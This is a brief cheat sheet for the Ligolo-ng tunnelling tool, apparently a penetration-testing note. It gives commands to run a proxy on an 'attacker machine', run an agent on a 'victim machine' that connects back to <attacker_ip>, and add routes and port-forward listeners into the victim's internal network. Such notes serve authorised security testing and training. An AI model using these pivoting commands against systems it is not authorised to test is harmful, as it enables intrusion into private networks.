# Lingolo-ng

## Basic Configuration

### Create a connection

#### **Proxy machine**

Start the Lingolo proxy with a self-signed certificate on attacker machine with root privileges.

```bash
sudo proxy --selfcert
```

#### Agent machine

Run the agent on the victim machine to connect to the Lingolo proxy.

```bash
./agent.exe --connect <attacker_ip>:<proxy_port> --ignore-cert
```

### Network Configuration

After the agent successfully connects, select the session.

```bash
session
```

### Start the network interface

Create a network interface on the proxy's machine.

```bash
tunnel_start --tun ligolo
```

### Add a new routing

List available interfaces on the agent.

```bash
ifconfig
```

Add a route to the internal interface.

```bash
add_route --name ligolo --route <internal_interface>
```

### Port Forward Listeners

Add a Listener.

```bash
listener_add --addr <agent_ip>:<port> --to <proxy_ip>:<port>
```

List Active Listeners.

```bash
listener_list
```

Stop a Listener.

```bash
listener_stop <ID>
```

### Delete interface

list interfaces

```bash
interface_list
```

Delete interface

```bash
ifdel --name ligolo
```
